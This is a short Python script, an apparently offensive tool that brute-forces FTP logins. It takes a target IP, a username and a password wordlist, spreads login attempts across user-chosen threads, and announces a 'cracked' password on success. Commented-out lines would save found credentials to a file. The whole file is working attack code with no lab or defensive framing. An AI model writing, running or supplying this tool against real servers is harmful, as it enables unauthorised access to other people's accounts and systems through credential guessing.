from ftplib import FTP as ftp
from termcolor import colored
import threading
import os


def try_login(ip, username, passwords):

    for password in passwords:
        server = ftp(ip)
        try:
            server.login(user=username, passwd=password.rstrip())
            print(
                colored(f'[+] Password cracked user: {username}   passwd: {password}', 'green'))
            # new_file = open('creds.txt', 'w')
            # new_file.write('Creds found '+username+' '+password)
            # new_file.close()
            os._exit(1)
        except Exception:
            # print(e)
            print(f'[-] Wrong password user: {username}  passwd: {password}')
        finally:
            server.quit()


def main():
    ip_addr = input('[*] Enter IP address               : ')
    user = input('[*] Enter user name                : ')
    wordlist = input('[*] Enter the path to the wordlist : ')
    thread_lmt = int(input('[*] Enter total no. of threads     : '))

    passfile = open(wordlist)
    passwords = passfile.readlines()

    length = len(passwords)//thread_lmt
    threads = []

    for i in range(0, len(passwords), length):

        wrap = passwords[i:i+length]
        brute = threading.Thread(target=try_login, args=[
                                 ip_addr, user, wrap])
        brute.start()
        threads.append(brute)

    for thread in threads:
        thread.join()


if __name__ == '__main__':
    main()
